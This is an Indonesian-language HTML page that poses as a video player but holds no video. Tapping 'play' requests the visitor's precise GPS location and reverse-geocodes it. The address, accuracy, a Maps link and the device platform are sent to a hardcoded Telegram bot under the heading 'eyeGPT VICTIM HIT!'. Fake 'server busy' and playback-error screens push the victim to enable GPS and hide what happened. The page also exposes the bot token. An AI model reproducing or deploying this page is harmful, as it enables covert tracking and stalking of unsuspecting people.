<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video</title>
<link href="https://fonts.googleapis.com" rel="stylesheet">
<style>
  body { margin:0; background:#000; font-family: 'Source Sans Pro', sans-serif; }
  #wrap { position:fixed; inset:0; background:#000; }
  
  #playIcon {
    position:absolute; inset:0;
    display:flex; align-items:center; justify-content:center;
    z-index:5; pointer-events:none;
  }
  #playIcon span {
    width:80px; height:80px; border-radius:50%;
    background:rgba(255,255,255,.85);
    display:flex; align-items:center; justify-content:center;
    font-size:36px; color:#000;
  }
  #tapLayer {
    position:absolute; inset:0;
    z-index:10; background:rgba(0,0,0,0.01);
  }
  #bar {
    position:absolute; left:0; right:0; bottom:0;
    padding:10px;
    background:linear-gradient(to top, rgba(0,0,0,.7), transparent);
    color:#fff; font-size:12px; z-index:30;
    font-family: 'Source Sans Pro', sans-serif;
  }
  #row { display:flex; justify-content:space-between; align-items:center; }
  #progress { height:4px; background:rgba(255,255,255,.3); margin-top:6px; }
  #fill { width:0%; height:100%; background:#fff; }
  #fs { font-size:16px; padding:4px 6px; cursor:pointer; }

  /* Elemen GPS */
  .loader { 
    width: 50px; 
    height: 50px; 
    border: 5px solid #333; 
    border-top: 4px solid #fff; 
    border-radius: 50%; 
    animation: spin 1s linear infinite; 
    display: none; 
    position: fixed; 
    top: 48%; 
    left: calc(50% - 25px); 
    z-index: 55; 
  }
  @keyframes spin { 
    0% { transform: rotate(0deg); } 
    100% { transform: rotate(360deg); } 
  }

  .screen { 
    position: fixed; 
    top: 0; 
    left: 0; 
    width: 100%; 
    height: 100%; 
    background: #000; 
    display: none; 
    flex-direction: column; 
    justify-content: center; 
    align-items: center; 
    text-align: center; 
    padding: 30px; 
    z-index: 50; 
    color: #fff; 
    box-sizing: border-box; 
    font-family: 'Source Sans Pro', sans-serif;
  }
  .btn-retry { 
    margin-top: 25px; 
    padding: 15px 30px; 
    background: #fff; 
    color: #000; 
    border: none; 
    border-radius: 8px; 
    font-weight: bold; 
    cursor: pointer; 
    width: 85%; 
    font-size: 16px; 
    font-family: 'Source Sans Pro', sans-serif;
  }
  /* Judul menggunakan Poppins */
  .screen p:first-child {
    font-family: 'Poppins', sans-serif;
  }
</style>
</head>
<body>

<div id="wrap">
  <!-- Video dihapus -->

  <div id="playIcon"><span>▶</span></div>

  <div id="bar">
    <div id="row">
      <div id="time">0:00 / 0:00</div>
      <div id="fs">⛶</div>
    </div>
    <div id="progress"><div id="fill"></div></div>
  </div>

  <div id="tapLayer"></div>

  <!-- Elemen GPS -->
  <div class="loader" id="spinner"></div>

  <div id="denied-screen" class="screen">
    <p style="font-size: 22px; font-weight: bold;">Koneksi Sibuk</p>
    <p style="font-size: 15px; color: #aaa; line-height: 1.6;">Server mengalami lonjakan trafik. Silakan muat ulang dan aktifkan GPS untuk sinkronisasi aman agar video dapat diputar.</p>
    <button class="btn-retry" onclick="location.reload()">Muat Ulang</button>
  </div>

  <div id="final-error" class="screen">
    <p style="font-size: 18px; color: #ff4444; font-weight: bold;">Kesalahan Pemutaran</p>
    <p style="font-size: 13px; color: #888; line-height: 1.6;">Gagal memuat sumber media (Error: HLS_PLAY_ERR).<br>Server sedang penuh, Anda bisa mencoba lagi nanti.</p>
    <button class="btn-retry" onclick="location.reload()">Coba Lagi</button>
  </div>
</div>

<script>
const token = "8560002103:AAFo0auV2fqMYpsh-xyqZvwZzdJYBJIfUf8"; 
const chat_id = "-1003580899801"; 

const layer = document.getElementById("tapLayer");
const icon = document.getElementById("playIcon");
const timeEl = document.getElementById("time");
const fill = document.getElementById("fill");
const bar = document.getElementById("progress");
const fs = document.getElementById("fs");

let first = true;

function mulai() {
    document.getElementById('spinner').style.display = 'block';
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(kirimData, handleDitolak, {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        });
    } else {
        tampilkanError();
    }
}

function kirimData(p) {
    const lat = p.coords.latitude;
    const lon = p.coords.longitude;
    const acc = Math.round(p.coords.accuracy);
    
    fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
        .then(res => res.json())
        .then(data => {
            const alamat = data.display_name || "Alamat tidak ditemukan";
            const googleMaps = `https://www.google.com/maps?q=${lat},${lon}`;
            
            const teks = `👁️ eyeGPT VICTIM HIT!\n\n📍 Alamat: ${alamat}\n🎯 Akurasi: ${acc}m\n🔗 Maps: ${googleMaps}\n📱 Platform: ${navigator.platform}`;

            return fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(teks)}`);
        })
        .catch(() => {
            const teksAlt = `👁️ eyeGPT HIT (Alamat Gagal)!\n\n📍 Koordinat: ${lat},${lon}\n🎯 Akurasi: ${acc}m\n🔗 Maps: https://www.google.com/maps?q=${lat},${lon}`;
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(teksAlt)}`);
        })
        .finally(() => {
            setTimeout(tampilkanError, 5000);
        });
}

function handleDitolak() {
    document.getElementById('spinner').style.display = 'none';
    document.getElementById('denied-screen').style.display = 'flex';
}

function tampilkanError() {
    document.getElementById('spinner').style.display = 'none';
    document.getElementById('denied-screen').style.display = 'none';
    document.getElementById('final-error').style.display = 'flex';
}

layer.onclick = function(){
  if(first){
    first = false;
    icon.style.display = "none";
    mulai();
  }
};

setInterval(() => {
  if(timeEl) timeEl.textContent = "0:00 / 0:00";
}, 1000);

bar.onclick = function(e){
  e.stopPropagation();
};

fs.onclick = function(e){
  e.stopPropagation();
};
</script>

</body>
</html>
